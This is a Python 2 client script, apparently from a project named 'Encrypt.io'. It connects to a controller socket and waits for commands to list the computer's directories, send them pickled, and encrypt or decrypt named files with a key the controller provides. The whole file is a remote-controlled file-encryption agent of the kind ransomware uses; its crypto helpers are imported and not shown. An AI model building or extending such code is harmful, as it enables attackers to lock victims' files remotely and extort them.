from socket import socket
import cryptography
import location
import os
import pickle


class Client(object):
    def __init__(self, ip, port):
        self.client_soc = socket()
        self.client_soc.connect((ip, port))
        self.dirs = []

    def send(self, data):
        self.client_soc.send(data)

    def receive(self):
        return self.client_soc.recv(2048)

    def update_dirs(self):
        self.dirs = location.get_dirs()

    # sends the compute's directories as a string
    def send_dirs(self):
        # pickled_data = pickle.dumps(location.get_dirs())
        pickled_data = pickle.dumps(self.dirs)
        # tree_len = len(pickled_data.encode('utf-8'))
        # self.client_soc.send(str(tree_len))
        print self.client_soc.send(pickled_data)

    def send_dirs_len(self):
        self.update_dirs()
        pickled_data = pickle.dumps(self.dirs)
        tree_len = len(pickled_data.encode('utf-8'))
        print tree_len
        self.client_soc.send(str(tree_len))

    # encrypts file on the computer by his name and a given key
    def encrypt(self, exported_key, file_name):
        print "name:", file_name
        if os.path.exists(file_name):
            print 'exist'
            cryptography.encrypt(exported_key, file_name)
            print "encrypted", file_name, 'with', exported_key

        else:
            print 'not exist'

    # decrypts file on the computer by his name and a given key
    def decrypt(self, exported_key, file_name):
        print "ex key", exported_key
        if os.path.exists(file_name):
            cryptography.decrypt(exported_key, file_name)
            print "decrypted", file_name, 'with', exported_key

    # splits the given command to list with 3 elements:
    # [first word, second word, the rest of the command]
    def split_command(self, command):
        splited_list = []

        if command.startswith('dirs') or command.startswith('len'):
            splited_list.append(command.split(' ')[0])
            return splited_list
        begin_index = command.index(' -----BEGIN')
        file_index = command.index(' ')+1
        splited_list.append(command[:file_index-1])
        splited_list.append(command[file_index:begin_index])
        splited_list.append(command[begin_index+1:])

        """
        words = command.split(" ")
        if len(words) < 3:
            return words
        splited_list.append(words[0])
        splited_list.append(words[1])
        splited_list.append(" ".join(words[2:]))
        """
        return splited_list

    # gets a command  by the protocol and executes the right method
    """protocol:
    encrypt/decrypt file key
    dirs
    len
    """
    def protocol(self, command):
        print command
        splited = self.split_command(command)
        if splited[0] == 'encrypt':
            self.encrypt(splited[2], splited[1])
        elif splited[0] == 'decrypt':
            self.decrypt(splited[2], splited[1])
        elif splited[0] == 'dirs':
            self.send_dirs()
        elif splited[0] == 'len':
            self.send_dirs_len()

    def run(self):
        while "Encrypt.io":
            command = self.receive()
            self.protocol(command)


c = Client('127.0.0.1',5001)
c.run()




